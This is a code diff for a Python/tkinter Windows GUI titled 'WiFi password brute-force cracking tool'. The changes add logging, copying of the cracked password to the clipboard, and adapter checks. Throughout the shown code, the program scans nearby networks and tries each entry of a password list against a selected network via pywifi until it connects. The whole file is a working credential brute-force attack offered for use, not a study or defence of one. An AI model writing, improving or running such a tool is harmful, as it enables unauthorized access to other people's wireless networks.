@@ -1,31 +1,20 @@
-# -*- coding: utf-8 -*-
+# coding=utf-8
 """
 @author:白恒aead
 """
-from cgitb import text
-from concurrent.futures import thread
-from ctypes.wintypes import SC_HANDLE
-from math import fabs
-from struct import pack
-import sys
-import io
-from venv import create
-from numpy import insert
-sys.stdout=io.TextIOWrapper(sys.stdout.buffer,encoding='utf8')
-
 import pywifi
 import time
 from pywifi import const
 
 import os
+import datetime
 import threading
 import tkinter as tk
 import tkinter.ttk as ttk
 from tkinter import CENTER, LEFT, messagebox as msg  #消息框
 from tkinter import filedialog as openfile  #打开文件夹
+import pyperclip
 import ctypes
-# from wifiCrackIcon import img   # 图标
-# import base64,os
 
 # 隐藏控制台窗口
 whnd = ctypes.windll.kernel32.GetConsoleWindow()
@@ -38,10 +27,11 @@ ctypes.windll.shcore.SetProcessDpiAwareness(1)
 # 获取屏幕的缩放因子
 ScaleFactor=ctypes.windll.shcore.GetScaleFactorForDevice(0)
 
-
 # 初始化窗口
 win = tk.Tk()
-win.title('Wifi密码暴力破解工具 @白恒aead')
+win.title('Wifi密码暴力破解工具v1.0 @白恒aead')
+if os.path.exists('wificrack.ico'):
+    win.iconbitmap("wificrack.ico") #设置图标
 win.lift()
 
 # 设置窗口大小并且居中显示
@@ -56,12 +46,10 @@ win.geometry("%dx%d+%d+%d" % (dialog_width, dialog_height, (screenwidth-dialog_w
 # 禁止调整窗口大小
 win.resizable(False,False)
 
-# # 设置打包图标
-# tmp = open("tmp.ico","wb+")  
-# tmp.write(base64.b64decode(img))#写入到临时文件中
-# tmp.close()
-# win.iconbitmap("tmp.ico") #设置图标
-# os.remove("tmp.ico")      #删除临死图标
+log_dir_path = os.getcwd()+"\\log" #日志目录路径
+# 如果不存在log目录，则创建
+if not os.path.exists(log_dir_path):
+    os.mkdir(log_dir_path)
 
 # 用来包裹frame的容器
 frame = tk.Frame()
@@ -98,7 +86,7 @@ filename = filepaths[len(filepaths)-1]
 # 显示正在使用的密码本
 lbl_pwdstitle = ttk.Label(frame_file,text='正在使用密码本:')
 lbl_pwdstitle.pack(side=tk.LEFT)
-lbl_pwds = ttk.Label(frame_file,text=filename)
+lbl_pwds = ttk.Label(frame_file,text="(无)")
 lbl_pwds.pack()
 
 # 选择密码本
@@ -148,9 +136,11 @@ win.tk.call('tk', 'scaling', ScaleFactor/75)
 # 用于输出消息
 def msgshow(msg):
     '''输出显示消息'''
-
+    dt = datetime.datetime.now()
+    with open("log\\wifi_crack_log_%s.txt"%(dt.strftime('%Y%m%d')),"a",encoding='utf-8') as log:
+        log.write(dt.strftime('%Y-%m-%d %H:%M:%S')+" >> "+msg)#输出日志到本地文件
     msg_info['state'] = 'normal'
-    msg_info.insert(tk.END,msg)
+    msg_info.insert(tk.END,dt.strftime('%Y-%m-%d %H:%M:%S')+" >> "+msg)
     msg_info.see(tk.END)
     msg_info['state'] = 'disabled'
 
@@ -173,13 +163,6 @@ def btnreset():
     btn_run['state'] = 'normal'
     btn_stop['state'] = 'disabled'
 
-# 判断字符串是否包含中文
-def is_contains_chinese(strs):
-    for _char in strs:
-        if '\u4e00' <= _char <= '\u9fa5':
-            return True
-    return False
-
 run = True
 # 暴力破解wifi密码的类
 class Crack():
@@ -191,10 +174,14 @@ class Crack():
         try:
             msgempty()
             wifi = pywifi.PyWiFi()  # 抓取网卡接口
-            self.iface = wifi.interfaces()[0]# 获取网卡
-            thread = threading.Thread(target=self.Search_WiFi,args=())# 获取附近wifi名称
-            thread.setDaemon(True)
-            thread.start()
+            if wifi.interfaces().__len__() > 0:
+                self.iface = wifi.interfaces()[0]# 获取网卡
+                thread = threading.Thread(target=self.Search_WiFi,args=())# 获取附近wifi名称
+                thread.setDaemon(True)
+                thread.start()
+            else:
+                msg.showwarning(title='警告',message='无法获取到无线网卡！\n请确保你的电脑拥有无线网卡再继续使用。')
+                msgshow('无法获取到无线网卡！\n请确保你的电脑拥有无线网卡才可继续使用。\n\n')
         except Exception as r:
             msg.showerror(title='错误警告',message='初始化时发生未知错误 %s' %(r))
             msgshow('初始化时发生未知错误 %s\n\n' %(r))
@@ -215,8 +202,7 @@ class Crack():
             ssids = []
             i = 0
             for data in bessis:#输出扫描到的WiFi名称
-                # ssids.insert(i,data.ssid.encode('raw_unicode_escape').decode('utf-8'))
-                ssids.insert(i,data.ssid)
+                ssids.insert(i,data.ssid.encode('raw_unicode_escape').decode('utf-8'))
                 i+=1
                 
             btn_Reflush['state'] = 'normal'
@@ -240,12 +226,12 @@ class Crack():
             msgshow('正在断开现有连接...\n')
             time.sleep(1)
             if self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:  # 测试是否已经断开网卡连接
-                msgshow('现有连接断开成功！\n')
+                msgshow('现有连接断开成功！\n\n')
             else:
-                msgshow('现有连接断开失败！\n')
+                msgshow('现有连接断开失败！\n\n')
                 return
-            msgshow('\n正在准备破解WiFi[%s]...\n\n'%(name))
-            with open(file_path,'r', encoding='gb18030', errors='ignore') as lines:
+            msgshow('正在准备破解WiFi[%s]...\n\n'%(name))
+            with open(file_path,'r', encoding='utf-8', errors='ignore') as lines:
                 for line in lines:
                     if run==False:
                         msgshow('破解已终止.\n')
@@ -265,11 +251,7 @@ class Crack():
                     elif akm=='UNKNOWN':
                         akm_v = 5
                     profile = pywifi.Profile()  #创建wifi配置对象
-                    # 判断wifi名称是否包含中文字符
-                    if is_contains_chinese(name):
-                        profile.ssid = name.encode('utf-8').decode('gbk')   # 对wifi名称进行utf-8解码
-                    else:
-                        profile.ssid = name.encode('raw_unicode_escape').decode('gbk')    # 对wifi名称进行unicode解码
+                    profile.ssid = name.encode('utf-8').decode('gb18030') #Wifi SSID 解码为gb18030
                     profile.key = pwd   #WiFi密码
                     profile.auth = const.AUTH_ALG_OPEN  #网卡的开放
                     profile.akm.append(akm_v)  #wifi加密算法，一般是 WPA2PSK
@@ -281,7 +263,7 @@ class Crack():
                     self.iface.connect(tem_profile)#连接
                     time.sleep(1)   #连接需要时间
                     if self.iface.status() == const.IFACE_CONNECTED:    #判断是否连接成功
-                        msgshow("连接成功，密码是%s\n\n"%(pwd))
+                        msgshow("连接成功，密码：%s\n\n"%(pwd))
                         msg_info['fg'] = 'green'
                         sel_wifiName['state'] = 'normal'
                         sel_wifiType['state'] = 'normal'
@@ -289,7 +271,8 @@ class Crack():
                         btn_file['state'] = 'normal'
                         btn_run['state'] = 'normal'
                         btn_stop['state'] = 'disabled'
-                        msg.showinfo(title='破解成功',message="连接成功，密码是%s"%(pwd))
+                        pyperclip.copy(pwd); #将密码复制到剪切板
+                        msg.showinfo(title='破解成功',message="连接成功，密码：%s\n(已复制到剪切板)"%(pwd))
                         return
                     else:
                         msgshow("连接失败，密码是%s\n\n"%(pwd))
@@ -335,20 +318,24 @@ def Reflush():
 # 开始暴力破解
 def GetPwdRun():
     try:
-        wifiName = sel_wifiName.get()
-        global crack
-        global run
-        run = True
-        sel_wifiName['state'] = 'disabled'
-        sel_wifiType['state'] = 'disabled'
-        btn_Reflush['state'] = 'disabled'
-        btn_file['state'] = 'disabled'
-        btn_run['state'] = 'disabled'
-        btn_stop['state'] = 'normal'
-        thread = threading.Thread(target=crack.Connect,args=(wifiName,))
-        thread.setDaemon(True)
-        thread.start()
-        msg_info['fg'] = 'black'
+        if file_path!="" and os.path.exists(file_path):
+            wifiName = sel_wifiName.get()
+            global crack
+            global run
+            run = True
+            sel_wifiName['state'] = 'disabled'
+            sel_wifiType['state'] = 'disabled'
+            btn_Reflush['state'] = 'disabled'
+            btn_file['state'] = 'disabled'
+            btn_run['state'] = 'disabled'
+            btn_stop['state'] = 'normal'
+            thread = threading.Thread(target=crack.Connect,args=(wifiName,))
+            thread.setDaemon(True)
+            thread.start()
+            msg_info['fg'] = 'black'
+        else:
+            if change():
+                GetPwdRun()
     except Exception as r:
         msg.showerror(title='错误警告',message='运行时发生未知错误 %s' %(r))
         msgshow('运行时发生未知错误 %s\n\n' %(r))
@@ -390,11 +377,10 @@ msg_info.pack(side=tk.LEFT,pady=10, fill=tk.Y)
 # 判断默认密码本是否存在
 if not os.path.exists(file_path):
     msg.showwarning(title='警告',message='默认密码本[%s]不存在！\n请选择密码本'%(file_path))
-    while(True):
-        if(change()):
-            crack = Crack()
-            thread = threading.Thread(target=crack.initCrack,args=())
-            thread.start()
-            break
+    file_path = ""
+    change()
+    crack = Crack()
+    thread = threading.Thread(target=crack.initCrack,args=())
+    thread.start()
 
 win.mainloop()
